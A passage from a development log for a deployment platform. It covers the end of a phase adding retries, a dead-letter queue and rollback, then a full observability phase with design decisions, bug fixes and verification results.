  the project lock, the container stages, the swap — is shared. `normalizeError()` now assigns
  retryability: a small set of host-shaped `AppError` codes (`DOCKER_UNAVAILABLE`,
  `DOCKER_BASE_IMAGE_MISSING`, storage) and the unclassified `PIPELINE_ERROR` are retryable.
  A rollback retires what it replaced as `rolled_back`, not `stopped`, and **skips image
  pruning**.
- `pipeline/container-stages.ts` — `ImageSource` is a discriminated union
  (`{kind:'build', workdir}` | `{kind:'reuse', tag, rolledBackFrom}`), and image acquisition is
  extracted into `acquireImage()`. The `reuse` path writes no Dockerfile, tars nothing, runs no
  `docker build` and stores no artifact.
- `docker/image.ts` — `findLocalImage(tag)`, returning `null` for "pruned" as an answer the
  caller acts on rather than an error.

**`apps/api`** (version `0.8.0`)
- `services/deployment-service.ts` — `retryDeployment()`, `rollbackToDeployment()`,
  `getRollbackTargets()`, `getOrgDeadLetters()`, `discardOrgDeadLetter()`, and `enqueueOrFail()`
  extracted so all three entry points share one "the queue is down" behaviour. `enqueueOrFail`
  takes a `fresh` flag: re-enqueuing an existing deployment must call `forgetDeploymentJob()`
  first, or BullMQ silently ignores the `add`.
- `routes/deployments.ts` — `POST …/deployments/:id/retry`, `POST …/deployments/:id/rollback`,
  `GET …/rollback-targets`, `GET /orgs/:orgId/dead-letters`,
  `DELETE /orgs/:orgId/dead-letters/:jobId`.
- `services/fleet-service.ts` — all three queues, each wrapped separately so one unreadable
  queue does not blank the others.

**`apps/dashboard`**
- `deployments-panel.tsx` — a **Retry** button on a failed deployment, a **Roll back** panel
  listing the project's previous deployments with what each still has (image / artifact / neither)
  and when it was live, `attempt N of M`, a dead-letter badge, and `↩ <parent>` markers in the
  build history.
- `deployment-pipeline.tsx` — a `skipped` prop, rendering a rollback's unrun stages dashed and
  struck through instead of green (a lie) or grey (looks broken).
- `fleet/page.tsx` — a **Dead letters** panel (error code, whether the budget was spent or the
  failure was unrecoverable, the deployment's status *now*, Discard for admins) plus the DLQ and
  container-action depths beside the queue counters.

### Decisions & assumptions

- **BullMQ owns retries; the processor only classifies.** All the worker does is rethrow or throw
  `UnrecoverableError`. Re-implementing backoff would mean re-implementing the delayed-set
  promotion that makes a retry land on a *different* worker, which is the property that matters.
- **The budget applies to retryable failures only.** A build that exits non-zero will exit
  non-zero on another worker too; spending three attempts proving it wastes minutes and buries the
  real reason under two more copies of it. `StageError.retryable` has existed since Phase 6 and
  the three container stages already set it deliberately — Phase 8 is where it started being read.
- **An unclassified failure is treated as retryable.** The asymmetry is deliberate: a wasted retry
  costs one build, a wrongly-dead-lettered deployment costs a human.
- **The injected-failure hook (`fail_at`) is classified retryable**, even though it is
  deterministic and will therefore burn the whole budget. It exists to make the machinery visible
  from a button: one click produces attempt 1 → 5s → attempt 2 → 10s → attempt 3 → dead-letter.
  The non-retryable path needs no simulation — a project whose build command exits 1 is one.
- **`deployments.attempt` counts runs of the row and is incremented in SQL.** The queue's counter
  governs retries; the row's counter is the history. They are different numbers and conflating
  them is what would make a manual retry look like attempt 1 forever.
- **`max_attempts` is the ceiling on `attempt`, re-based by a manual retry.** A manual retry is a
  new BullMQ job and legitimately gets a fresh budget, so "attempt 4 of 6" rather than
  "attempt 4 of 3".
- **A manual retry re-runs the same row.** An automatic retry and a clicked one are the same
  event, and giving them different shapes in the history would make the build list unreadable.
  One row per deploy *intent*, carrying its attempt count.
- **The race on Retry is settled in Postgres, not with a lock.** `requeueForRetry` is conditional
  on `status = 'failed'`, so the second of two simultaneous clicks matches no rows and is told
  "already in flight". `enqueued: false` is a 200, not a 409 — a double-clicked button has got
  what it asked for.
- **The dead-letter queue has no consumer.** A DLQ with a worker on it is a slower retry loop.
  The point is that a failure *stops*, stays readable, and needs a human decision.
- **The DLQ hop is recorded twice, in two separate `try` blocks.** Postgres (`dead_lettered_at` +
  a timeline line) is the half that must land; the queue entry is the detail. Splitting them is
  what stops a Redis failure taking the explanation down with the mark — see bugs, #1.
- **DLQ job ids are `<deployment>_a<attempt>`.** BullMQ rejects a custom id containing `:`, and
  the attempt suffix is what makes the hop idempotent while still letting a *later* attempt park
  its own entry.
- **Dead letters are filtered by org in the API process.** BullMQ has no notion of a tenant, so
  `deployments-dlq` holds every org's entries in one list; returning it raw would leak other
  tenants' deployment and project ids to any member. Reading the whole (bounded) queue and
  dropping what is not ours is the only correct way to serve it. Reading is `member`; discarding
  is `admin`, and a cross-tenant discard is a 404 rather than a 403 — the entry does not exist to
  them.
- **A rollback is a new deployment row with `parent_deployment_id` set**, not a revival of the old
  one. It has its own attempt, container, timeline and health check; the target has to survive as
  the thing being pointed *at*; and `rolled_back` can then be recorded on the deployment that was
  rejected, which is the question the history is actually asked.
- **Image first, artifact second — and the *worker* decides.** Only the worker can see the Docker
  host, so the API records the intent (copying the target's `image_tag` onto the new row) and the
  worker picks the path. Reusing the image is byte-for-byte what was proven to work and takes
  ~1.7s; rebuilding from the artifact reproduces the same app from the same bytes under a *new*
  tag and takes ~4s. The API reports `hasImage` as "recorded", never "present".
- **A rollback offers only `stopped` / `rolled_back` deployments that carry a `live` event.** Two
  conditions because each answers a different question: the status says it is out of service and
  therefore something to return to, the `live` event proves it ever worked. Rolling back to a
  deployment that never went live is not a rollback, so `failed` rows are not offered — and the
  endpoint enforces the same predicate the list filters on.
- **A rollback does not prune images.** It reaches backwards through the image history and the
  image it just adopted is by definition one of the oldest; pruning by count here could untag the
  image now serving and would shrink the reach of the next rollback right after proving that reach
  was worth having.
- **The reused image is not re-tagged for the rollback.** Two deployments then name one image,
  which is correct — they *are* the same image.
- **The container-actions queue keeps one attempt and no DLQ hop.** Phase 7 left this open. A stop
  or restart is a direct user action with a button still on screen: surfacing the failure so it can
  be clicked again is better than retrying against a daemon that may have come back, and parking it
  would mean a queue whose entries nobody would ever read.
- **`rolled_back` stays terminal with no exits.** A rolled-back deployment can still be a rollback
  *target* (it is in the candidate set), which is how "roll forward again" works without giving the
  status an outgoing edge.

### Bugs found and fixed during verification

1. **The dead-letter hop failed and took the explanation with it.** BullMQ rejects a custom job id
   containing `:`, so `enqueueDeadLetter` threw `Custom Id cannot contain :`. The separator is now
   `_a`. The more interesting half is what the failure exposed: `markDeadLettered()` had already
   written, and the timeline line was *after* the enqueue inside the same `try`, so the dashboard
   showed a "dead-lettered" badge with nothing behind it and no line saying why. The two records
   are now written in separate `try` blocks, Postgres first, so a Redis failure degrades to
   "recorded and explained, but not parked" instead of neither.
2. **A successfully-retried deployment stayed `live` while carrying `BUILD_ABORTED`.** The
   automatic re-queue only wrote `status = 'queued'`; it left `error_code`, `error_message`,
   `finished_at` and `dead_lettered_at` from the attempt that failed, and the `live` write did not
   clear them either. So a deployment that recovered on attempt 2 reported an error to the
   dashboard, which rendered the red failure box on a live deployment. The manual path
   (`requeueForRetry`) had always cleared those columns — the two disagreed. Both the automatic
   re-queue and the `live` write now clear them, so "live *and* carrying an error code" is not a
   row the database can hold. The reason is not lost: it is in `deployment_events`, and in the
   dead-letter entry if the budget ever runs out.

**Four harness bugs worth recording, because two of them looked like product failures:**
`waitStatus(..., ['live','failed'])` settles on the *intermediate* `failed` a retried deployment
passes through, five seconds before the retry even starts — which made a working retry look like
a permanent failure until the BullMQ job was inspected directly (`attemptsMade: 2`, `completed`);
counting a project's containers immediately after a swap reads inside the ~1s window Phase 7
documented, so those assertions now wait for convergence (`expectContainers`) rather than
asserting an instant; a `waitFor` callback returning the number `0` is falsy, so "the last
dead-letter entry was discarded" polled until it timed out on a discard that had succeeded; and
measuring the loser's `creating_container`→settle window to its *last* status event stretched it
past the lock release, because `stopped` on the loser is written by the winner's pipeline
afterwards. Two environment traps also cost time: a `pnpm dev` left running from an earlier
session had its own API and worker competing for the queue, and `tsx watch` restarts a worker you
SIGTERM — so the verification stack runs plain `tsx` with named workers (`alpha`, `bravo`).

### Verification (all run on 2026-09-07)

Six scratchpad suites against the real stack (Postgres + Redis + API `0.8.0` + two named workers +
Docker, base image `node:22-alpine`), `DEPLOY_JOB_ATTEMPTS=3`, `DEPLOY_JOB_BACKOFF_MS=5000`.
**245 assertions, all passing.** Counts are the suites' own.

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 8 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 5 packages + api + worker (tsc) + dashboard (`next build`, 10 routes) |
| `pnpm --filter @forge/db migrate up` | ✅ `max_attempts`, `dead_lettered_at`, the check constraint and the partial index applied |
| **Retries & dead-letter** | ✅ **73/73** |
| … a retryable failure runs exactly 3 attempts and ends `failed` + dead-lettered | ✅ 16.5s wall clock, so 5s + 10s of backoff was really waited |
| … the timeline shows 3 `queued` / 3 `failed`, each retry naming its attempt | ✅ "Retrying automatically after BUILDING_FAILED (queue attempt 2 of 3)" |
| … a non-retryable failure (`npm run build` exits 3) | ✅ **1** attempt, `432ms`, no backoff, "will not succeed on a retry" |
| … the DLQ entry: code, attempt, budget, retryable flag, worker, `<id>_a<n>` job id | ✅ all present |
| … the entry is enriched with the deployment's status *now* | ✅ shows `live` for one that was later retried successfully — a stale entry |
| … no container left behind by any failed attempt | ✅ |
| **Manual retry** | ✅ same row, attempt 2, `max_attempts` re-based 3 → 4, went live, app answers 200 |
| … the dead-letter mark and the previous error are cleared | ✅ both `null` |
| … the image tag carries the attempt | ✅ `…:035137bf-2` |
| … Retry on a live deployment | ✅ `200` `enqueued:false` "This deployment is live. Deploy again…" |
| **Dead-letter tenancy** | ✅ another org sees **0** of ours; a cross-org discard is `404`; the owning admin's discard is `204` |
| … discarding does not touch the deployment row or its 191-event timeline | ✅ and its container is still serving |
| **`GET /fleet`** | ✅ all three queues named and readable, DLQ depth non-zero |
| **Rollback** | ✅ **63/63** |
| … targets: the replaced deployment is offered, the serving one is not | ✅ with `hasImage`, `hasArtifact` (1 992 B) and `liveAt` |
| … rollback via the reused image | ✅ live in **1 673 ms**, serving v1's code, from v1's exact tag |
| … the recorded pipeline | ✅ `queued → assigned → creating_container → starting → health_check → live` — no clone, install or build stage entered |
| … and the log | ✅ names the reused image, says "nothing to clone, install or build"; no `docker build`, no `npm install` |
| … the deployment it replaced | ✅ `rolled_back` (not `stopped`), container removed, project re-pointed, one container total |
| … and is itself offered as a target afterwards | ✅ roll-forward works |
| … rollback after `docker image rm` of the target's image | ✅ accepted, live, serving v2's code, under a **new** tag |
| … its recorded pipeline | ✅ `… → cloning → creating_container → …` — the artifact extraction is the clone; install and build still skipped |
| … and the log | ✅ "no longer on this Docker host (pruned by DOCKER_KEEP_IMAGES=…)", "falling back to the stored artifact", a `docker build` ran, `npm install` did not |
| … refusals | ✅ the active deployment `409 ALREADY_ACTIVE`; a `failed` one `409 NOT_ROLLBACK_TARGET` and not offered; a non-member `404` |
| … two identical rollback requests in parallel | ✅ one `202` + one `200`, one row, one container, serving v1 |
| **Demo checkpoint** (ROADMAP) | ✅ **30/30** |
| … good deploy → forced failure auto-retries 3× (24.5s) → dead-lettered | ✅ and the previously-live deployment **stayed live and answering** throughout |
| … then a regression goes live, then roll back to the last good one | ✅ live in **1 691 ms**, regression recorded `rolled_back`, one container |
| … the dead-lettered deployment is not offered as a rollback target | ✅ |
| **Idempotency** | ✅ two parallel identical deploys → one `202` + one `200`, one row, **one** container; a later replay of the same key is also `200` |
| **Worker killed mid-build** | ✅ **19/19** |
| … SIGTERM to the worker holding the job | ✅ `BUILD_ABORTED`, "because the worker is shutting down" — not reported as a broken build |
| … the queue retried it | ✅ went live on attempt 2, on the **other** worker (`alpha → bravo`), app answers 200 |
| … and carries no error code, while the timeline still records the aborted attempt | ✅ never dead-lettered |
| **Rollback racing a fresh deploy** | ✅ **12/12** — exactly one live, one container, project points at it |
| … their `creating_container`→outcome windows | ✅ **did not overlap** (12202–13370 then 14048–18483) — the project lock serialised them |
| **Browser E2E (headless Chrome via CDP)** | ✅ **48/48**, 0 console errors, 0 page exceptions |
| … the failed deployment's card | ✅ dead-letter badge, `BUILD_FAILED`, a Retry button, `DLQ` on the history row |
| … clicking **Retry** | ✅ went live as attempt 2; the page showed "attempt 2 of N" over the WebSocket without a reload, badge gone |
| … the **Roll back** panel | ✅ target listed with `image` + `artifact` chips and "was live … ago" |
| … clicking **Roll back** on a specific row | ✅ created a rollback pointing at it, live, reusing its image |
| … the pipeline strip on the rollback | ✅ exactly **3** stages rendered struck-through as "skipped by this rollback": Cloning source, Installing, Building |
| … the fleet page | ✅ Dead letters panel with the code, why it stopped, the status *now*, and `deployments-dlq` / `container-actions` depths |
| … clicking **Discard** | ✅ real `DELETE` issued, entry removed, deployment row and 191-event timeline untouched |
| … any host filesystem path on either page | ✅ none |

### Not done / deferred on purpose

- **Still no Vitest suites.** Eight phases of accumulated test debt. Verification is scratchpad
  scripts (now twenty-eight, ~690 assertions) plus the CDP browser suite. Still the project's
  biggest gap, and still growing.
- **Nothing re-drives the dead-letter queue.** An entry can be read and discarded; "retry
  everything in the DLQ" is a button that does not exist, and a parked entry is not a route back
  into the pipeline — you retry the *deployment*, not the entry.
- **`DEPLOY_DLQ_KEEP` trimming is untested.** The `trim()` path is there and bounded, but filling
  a 1 000-entry queue to watch the oldest fall off was not worth the wall clock.
- **`PROJECT_LOCKED` is classified retryable but was not separately exercised.** The lock's
  serialisation is verified (windows do not overlap); a deployment actually *losing* the lock wait
  and being retried needs a lock held longer than `DOCKER_LOCK_WAIT_MS`, which the fast paths here
  never produce.
- **A rollback cannot be told to fail.** `fail_at` is deliberately not accepted on the rollback
  endpoint, so Phase 11's injected-failure demos do not cover the rollback pipeline.
- **The artifact fallback trusts the artifact's shape.** It is extracted into `sandbox.sourceDir`
  and used directly, because it is a tar of the workdir the original build produced — so
  `root_dir` must not be applied twice. A hand-crafted `kind='artifact'` row pointing at something
  else would be extracted (with the same traversal/size caps as a source archive) and then fail at
  `docker build`, not before.
- **`max_attempts` can be raised without limit by repeated manual retries.** It is a display
  ceiling, and the check constraint caps it at 100; nothing stops someone clicking Retry
  thirty-three times.
- **No cancel, still.** `canceled` remains in the state machine with nothing driving it.
- **No per-deployment total timeout**, only per stage — and a retried deployment now has three
  stage budgets rather than one, so the worst case tripled.
- **Rollback is per project, not per org.** There is no "roll the whole org back", and no
  ordering guarantee between rollbacks of different projects.
- Everything Phase 7 deferred still stands: the build runs on the host, a container can reach host
  services through the Docker gateway IP, runtime logs stop at the health check, the URL changes
  on restart, git sources are unimplemented, and image pruning has no global disk budget.

### Next up — Phase 9 (Observability)

The counters Phase 9 needs to chart now exist and are already being read: `deployments.attempt` /
`max_attempts` make retry rate measurable, `dead_lettered_at` makes the failure rate a Postgres
query rather than a log grep, and `getFleet()` already reports all three queues' waiting/active/
failed depths through one call. What is missing is the *publisher*: those numbers are polled over
REST every two seconds by the fleet page, and Phase 7's container stats are polled the same way
because the `metrics` topic's frame is global and a per-deployment sample on it would be a
cross-tenant leak. Phase 9 owns that frame, so it is the phase that can put container stats,
queue depth and event-loop lag on one scoped channel and let the dashboard stop polling. Two
things already measured but never exposed: `duration_ms` is on every deployment row (so
percentile charts need no new writes) and `StageError.code` is a stable, greppable label that
would group a failure histogram usefully.

---

## Phase 9 — Observability ✅

**Goal:** the metrics dashboard — event-loop lag, CPU/memory per process, queue depth,
deployment durations and per-container stats, exposed at `/metrics` and on the `metrics`
WebSocket topic.
**Completed:** 2026-09-07.

### What shipped

**`packages/shared`** — the contract
- `src/metrics.ts`: `ProcessMetrics` (one document per live process, with `ApiRuntimeMetrics` /
  `WorkerRuntimeMetrics` halves and an `EventLoopLag` histogram summary), `DeploymentMetrics`
  (windowed counts, `DurationStats`, `FailureBucket[]`), and `MetricsSnapshot` — the single
  response the dashboard renders. Plus `METRIC_NAMES` (every metric name in one place, because a
  typo at any of four call sites is a chart that is silently always empty), `processScope()` /
  `parseProcessScope()`, `percentileOf`, `meanOf`, `round`.
- `byStatus` is keyed by `string`, not by the status enum: a `z.record` over an enum demands every
  key be present, and "the statuses that occurred" is the honest shape.
- New `REDIS_KEYS`: `processMetrics(role, instance)`, `metricsProcesses` (the index set),
  `queueMetricsLock` (the publisher election).
- `metricMessageSchema` already existed from Phase 5 — Phase 9 is the publisher it was waiting for.

**`packages/metrics`** (new, `@forge/metrics`) — the measuring
- `ProcessSampler`: `perf_hooks.monitorEventLoopDelay()` (histogram, reset every tick),
  `performance.eventLoopUtilization()`, `process.cpuUsage()` deltas → percent of one core,
  `process.memoryUsage()`, `process.getActiveResourcesInfo().length`.
- `LatencyWindow`: a fixed-size ring of request latencies plus per-interval counters. A ring
  rather than clear-on-read, so a percentile still has samples during an idle second.
- `MetricsReporter`: the timer that samples, writes the document to Redis and publishes samples.
  Both sinks are **injected** (`store` / `publish`) so the package depends on `@forge/shared` alone.
- `renderPrometheus()`: the text exposition format, hand-written (ARCHITECTURE §6 names `/metrics`
  as a thing to implement; `prom-client`'s registry/bucketing is weight we don't use). One
  HELP/TYPE pair per name, escaped label values, and a null value is **omitted** rather than
  emitted as 0.
- `queueMetricSamples()` / `containerMetricSamples()` / `processMetricSamples()`.

**`packages/db`**
- `src/repositories/metrics.ts` → `metricsRepo.getDeploymentMetrics({ orgId?, windowMinutes })`:
  three queries (status counts + retry/DLQ flags; `percentile_cont` durations + the success count;
  failures grouped by `error_code`, capped at 15 rows). Nothing new is written — every input
  column has been on `deployments` since Phases 4–8.
- Migration `1757600000000_observability-indexes`: `(org_id, created_at DESC)` for the org-scoped
  snapshot and `(created_at DESC)` for the global scrape. Indexes only, no data migration.

**`apps/api`**
- `plugins/observability.ts`: registers the HTTP timing hooks, runs the reporter, and holds the
  queue-depth **election**. Decorates `app.processMetrics()`.
- `observability/http-metrics.ts`: `onRequest` / `onResponse` / `onRequestAbort` hooks; latency
  from Fastify's own `reply.elapsedTime`.
- `observability/metrics-store.ts`: writes this process's document (TTL) + index membership,
  publishes samples over the publisher connection, and `readFleetMetrics()` reads every process
  back, pruning index entries whose document has expired.
- `services/metrics-service.ts`: assembles the snapshot from four sources in one pass.
- `routes/metrics.ts`: `GET /metrics` (Prometheus text, host-wide) and
  `GET /orgs/:orgId/metrics` (JSON, org-scoped, `requireOrg`).
- `services/health-service.ts`: `checkDependencies()` split out so the metrics page and `/health`
  run the same probes.
- `services/fleet-service.ts`: `readQueueStats()` extracted, shared by the fleet view, the
  snapshot and the `metrics` publisher.
- `services/container-service.ts`: `readContainerStats()` exported (was private).
- `realtime/client-socket.ts`: tenant channels now accept **metric** frames as well as pipeline
  events, tried in frequency order.
- `API_VERSION` → `0.9.0`.

**`apps/worker`**
- `observability/metrics-sink.ts`: the worker's `store`/`publish` sink, `publishContainerMetrics()`
  (deployment/project/org channels), and `forgetProcessMetrics()` for a clean exit.
- `main.ts`: a `MetricsReporter` with worker extras (`workerId`, status, active jobs, active
  `child_process` builds, Docker reachability); stopped and its document deleted on shutdown.
- `services/container-monitor.ts`: every sample is now stored **and** published.
- `services/worker-registry.ts`: `currentStatus` / `registeredId` getters.

**`apps/dashboard`**
- `components/ui/charts.tsx`: `TimeChart` (multi-series line+area, hairline grid, crosshair +
  tooltip, end markers with a surface ring, selective end labels), `BarList`, `StatTile` (with an
  optional trend sparkline), `DataTable`, and the `VIZ` palette.
- `lib/metrics.ts`: `MetricSeries` — a bounded ring of series (150 points ≈ 5 min at the default
  cadence) mutated in place, plus `seedFromSnapshot()` and `liveScopes()`/`retain()`.
- `app/orgs/[orgSlug]/metrics/page.tsx`: window presets, dependency chips, a "Show numbers" table
  toggle, deployment counts + duration percentiles + failure histogram, the queue-depth chart, one
  card per process (CPU, loop utilisation, RSS, handles, event-loop lag p50/p99, memory, and the
  role-specific counters), per-container CPU/memory, and the system-activity feed.
- `app/orgs/[orgSlug]/containers/page.tsx`: container stats are now driven by `metric` frames on
  the org topic, with the REST poll dropped to a 15 s fallback.
- `components/app-shell.tsx`: a **Metrics** nav entry.
- `lib/api.ts`: the mirrored types + `formatUptime`.

**Config** — `METRICS_INTERVAL_MS` (2000, 0 disables), `METRICS_TTL_SECONDS` (15),
`METRICS_WINDOW_MINUTES` (60), `METRICS_TOKEN` (optional), `METRICS_LATENCY_SAMPLES` (512).
Documented in `.env.example`; `.env` gets a generated token.

### Decisions & assumptions

- **A new package rather than duplicating the sampler.** The API and the worker measure themselves
  identically, and `@forge/shared` cannot hold the code because it must stay importable as the
  browser's type mirror (no `node:perf_hooks`). `@forge/metrics` therefore *measures and formats*
  only: it opens no Redis connection and reads no env, and each app injects a two-function sink.
  ARCHITECTURE §9's boundary table was updated.
- **Process metrics live in Redis under a TTL, not in memory.** That is what makes `/metrics` on
  any API replica report the *whole* fleet — including workers, which serve no HTTP and could not
  otherwise be scraped at all. It also means a SIGKILLed process disappears on its own, exactly
  like a worker heartbeat.
- **An index set, not `KEYS`/`SCAN`.** `metrics:processes` holds `<role>:<instance>` ids; the
  documents' TTLs decide which are real and the *reader* prunes the rest, because the writer of a
  stale entry is by definition gone.
- **Event-loop lag has the histogram resolution subtracted.** libuv records the whole interval
  between timer firings, so an idle process reports ~10 ms with a 10 ms resolution. Charting that
  raw gives every healthy process a permanent 10 ms floor and makes a real 40 ms stall look like a
  4× rise instead of the 40 ms it is. Verified: idle p50 went from 10.08 ms to 0.09 ms.
- **The histogram is reset every tick.** A lifetime-cumulative histogram flattens into a straight
  line within a minute, which is useless as a live chart.
- **Queue depth is published by an elected process.** BullMQ's counters belong to the queue, not to
  the process reading them; three API replicas each publishing them would chart three times the
  real depth. A short `lock:queue-metrics` lease per tick, best-effort, no renewal — the same shape
  as the container sampler's lease. The counters remain *readable* by everyone over REST.
- **Container samples do NOT ride the global `metrics` channel.** `authorizeTopic` treats `metrics`
  as infrastructure-wide (any authenticated member, like `GET …/fleet`), and a container belongs
  to one org — so putting a tenant's CPU trace there would be a cross-tenant leak. They are
  published on `deployment:<id>` / `project:<id>` / `org:<id>` instead, whose subscriptions are
  already authorized per tenant. This is additive to the WS contract: `metric` was already a
  declared frame type; what changed is that tenant channels now carry it too.
- **"Succeeded" is `EXISTS (a live status event)`, not `status = 'live'`.** A deployment that went
  live and was later replaced now reads `rolled_back` or `stopped`; counting that as a failure
  would make every rollback demo look like an outage.
- **`successRate` is null, not 0, when nothing settled.** A rate over an empty set is not "0%
  successful", and a chart rendering it as such reads as an outage.
- **An unreadable queue publishes nothing rather than zeroes** — a chart dropping to 0 when Redis
  blips reads as "the backlog cleared", the opposite of the truth. Same rule in the Prometheus
  renderer: `queue_available` goes to 0 and the counters are omitted.
- **`GET /metrics` requires a credential.** A session or API key (the fleet-view rule: membership
  of some org), or `METRICS_TOKEN` as a bearer for a scraper, compared with `timingSafeEqual`. It
  exposes hostnames, pids and container id prefixes; shipping it open would teach the wrong habit.
- **Two data paths on the dashboard, on purpose.** The snapshot is polled every 5 s (its Postgres
  aggregates are `GROUP BY`s over a window and are not free); the fast-moving numbers arrive as
  frames. Series history is built **in the browser** and capped at 150 points — a server-side
  history would mean writing every sample to Postgres forever to serve a view of the last five
  minutes. The consequence is stated on the page: tiles are populated instantly, charts fill in.
- **Chart palette is separate from the UI's status colours.** Series use `#3987e5 / #199e70 /
  #c98500`, validated against the dashboard surface `#0d0f16` for the lightness band, chroma
  floor, colour-vision separation (worst all-pairs ΔE 8.4 protan) and 3:1 contrast. The
  emerald/sky/amber the badges use are *status* colours and must not impersonate a series. Three
  slots only — a fourth series is a signal to facet, which is why processes are small multiples
  (one card each) rather than one chart with every process on it.
- **Charts are hand-rolled SVG.** Same reasoning as the Prometheus renderer; also keeps the
  dashboard's dependency list unchanged.
- **`/metrics` declares no response schema.** The type provider would narrow `reply.send()` to the
  declared shapes and this route's body is a plain string; the 401 body still comes from the one
  error-handler plugin.

### Bugs found and fixed along the way

- **The `metrics` topic delivered nothing, silently.** The symptom was visible only in the
  gateway's own counters: `forge_ws_topics 2`, `forge_ws_pubsub_channels 1`. `subscribeChannel()`
  kept a refcounted registry keyed by channel, and `reconcile()` removed a channel's entry with an
  unguarded `channels.delete(channel)`. A `release()` closure captured against an old state object
  therefore evicted the entry a *newer* subscriber had just installed for the same channel — while
  the Redis SUBSCRIBE stayed in place, so `subscriber.on('message')` looked the channel up, found
  nothing, and dropped every frame in silence. Fixed in `apps/api/src/lib/pubsub.ts`: deletes are
  now identity-guarded (`channels.get(channel) === state`), and `subscribeChannel()` adds its
  handler *before* re-asserting the registry entry unconditionally, which closes both interleavings.
  Pre-existing since Phase 5; nothing before Phase 9 subscribed and unsubscribed the same channel
  fast enough to hit it.
- **What was triggering that churn**: `RealtimeProvider`'s context value re-bound `subscribe` on
  every change of `instance`, which is only known once the `hello` frame lands — a beat *after* the
  socket opens. Every `useTopic` effect tore its subscription down and rebuilt it immediately after
  connecting, which also replayed a deployment's whole event history twice. `subscribe` is now
  bound once per client. Both fixes shipped together; the registry guard is the correctness fix and
  was not exercised in isolation.
- **`ClientSocket.deliver()` counted a dropped frame without scheduling the drop notice.** When the
  replay buffer overflowed, `droppedFrames` was incremented but `scheduleDropNotice()` was not
  called, so the client was told only if some *later* drop happened to schedule one — and never at
  all if none did. Now it counts and schedules, like the slow-consumer path.
- **`revalidateAccess()` bailed out of the whole pass on a Redis error.** One blip skipped not just
  the remaining sockets' session checks (deliberate — they would all fail the same way) but their
  *subscription* re-authorization too, which reads Postgres and is unaffected. Now a `redisDown`
  flag skips only the session half.
- **Fastify rejects a zero-argument async `onRequestAbort` hook** with
  `FST_ERR_HOOK_INVALID_ASYNC_HANDLER` — it validates that hook as having exactly one parameter.
  The API refused to boot until the unused `_request` was added.
- **Chart axis labels were clipped and duplicated.** A fixed 44 px gutter cannot hold "190.7 MiB",
  and a 0..1 domain rendered ticks "0", "1", "1" (the midpoint rounding into its neighbour). The
  gutter is now measured from the widest formatted label, small integer domains get two ticks, and
  any label that still collides keeps its gridline and loses its text. Three series resting on zero
  also stacked three identical end labels on one pixel — a label is now dropped when another series
  has already claimed that row.

### Verification

Browser-driven (headless Chrome over CDP), plus direct scrapes. No Vitest suites — see below.

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 9 workspaces (incl. the new `@forge/metrics`) |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 6 packages + api + worker + dashboard (`next build`, 11 routes) |
| `pnpm --filter @forge/db migrate up` | ✅ both observability indexes applied |
| `GET /metrics` unauthenticated | ✅ **401** |
| `GET /metrics` with `Authorization: Bearer $METRICS_TOKEN` | ✅ **200**, `text/plain` exposition |
| … reports **both** processes | ✅ `process_up{role="api"}` and `{role="worker"}` — the worker serves no HTTP and is scraped only because its document is in Redis |
| … process series | ✅ cpu, rss, heap used/total, external, loop lag p50/p99/max, loop utilisation, active resources, uptime |
| … api series | ✅ ws sockets/topics/pubsub channels, rps, in-flight, latency p95, 4xx/5xx |
| … worker series | ✅ active jobs, active builds, concurrency, docker availability, with a `status` label |
| … all three queues | ✅ `deployments` (completed 143, failed 39), `deployments-dlq` (22 parked), `container-actions`; each with `queue_available` |
| … deployment aggregates | ✅ total, by status, retried, dead-lettered, in-flight, success rate `0.9011`, duration quantiles (p50 4055 ms / p95 5271 ms / max 6306 ms) + `_count`, failures by code (4 distinct codes) |
| … dependencies | ✅ `dependency_up{postgres}` / `{redis}` + latencies |
| … one HELP/TYPE pair per metric name | ✅ (verified by eye over the full output; a repeated TYPE is a parse error) |
| **Event-loop lag correction** | ✅ idle p50 10.08 ms → **0.09 ms** after subtracting the resolution |
| **`metrics` WS topic** | ✅ **226 frames** received in 12 s on one socket (CDP `Network.webSocketFrameReceived`), after `{"type":"subscribe","topic":"metrics"}` |
| **Gateway registry consistency** | ✅ `forge_ws_topics 2` / `forge_ws_pubsub_channels 2` — was 2/1 before the pubsub fix |
| … after six page navigations (subscribe/unsubscribe churn) | ✅ still 2/2, frames still flowing (path length 92 → 157 chars) |
| **Charts advance live** | ✅ the api lag path grew 345 → 446 → 547 chars over 16 s |
| **Demo checkpoint: metrics move while a deployment runs** | ✅ deployed `hello-forge` from the dashboard's own session |
| … worker card | ✅ **Active jobs 1 / 2** mid-build, back to 0 / 2 after |
| … containers panel | ✅ 0 → **1** as the container went live, with CPU/memory percent charts and 23 / 256 pids |
| … system activity | ✅ all **9** transitions streamed in, newest first, `Queued → … → Live at http://localhost:32946` |
| … a second deployment | ✅ the first recorded `Stopped — Replaced by a newer deployment now serving …`; duration p50 re-computed over 2 samples |
| **Containers page** | ✅ stats now say "sampled just now" (frame-driven) rather than up to 3 s stale |
| **Table view** | ✅ "Show numbers" renders 4 tables (per-queue, per-status, and one per process card) |
| **Tooltip** | ✅ crosshair reads `2:58:27 PM · 0 Waiting · 0 Active · 0 Delayed (backoff)` — every series at that instant, value before label |
| **Axis labels** | ✅ 0 text nodes at x < 4 px (nothing clipped); queue axis renders `0` / `1`, one end label instead of three |
| **Console** | ✅ 0 page exceptions, 0 `console.error`, 0 error-level log entries across every run |
| **Palette** | ✅ `validate_palette.js` on `#3987e5,#199e70,#c98500` against `#0d0f16`, `--pairs all`: all six checks pass |

### Not done / deferred on purpose

- **Still no Vitest suites.** Nine phases of accumulated test debt, and this phase deliberately did
  not add scratchpad assertion scripts either — verification was the browser plus direct scrapes.
  `percentileOf`, `LatencyWindow`, `renderPrometheus` and `getDeploymentMetrics` are all pure or
  near-pure and are the most obviously unit-testable code in the repo. Still the biggest gap.
- **No metric history on the server.** Series exist only in the browser tab that is watching, capped
  at ~5 minutes. Reload the page and the charts start again. A real system writes samples to a
  TSDB; the Prometheus endpoint is the hook for that, and nothing scrapes it here.
- **`/metrics` is not scraped by anything.** No Prometheus, no Grafana. The endpoint is verified by
  `curl` only, so the format is checked by eye rather than by a parser.
- **No `deployment_duration_ms` histogram buckets** — the summary reports p50/p95/max as quantile
  labels, which Prometheus cannot aggregate across instances. It is one process's view of a
  Postgres query, so there is nothing to aggregate here, but it would be wrong at scale.
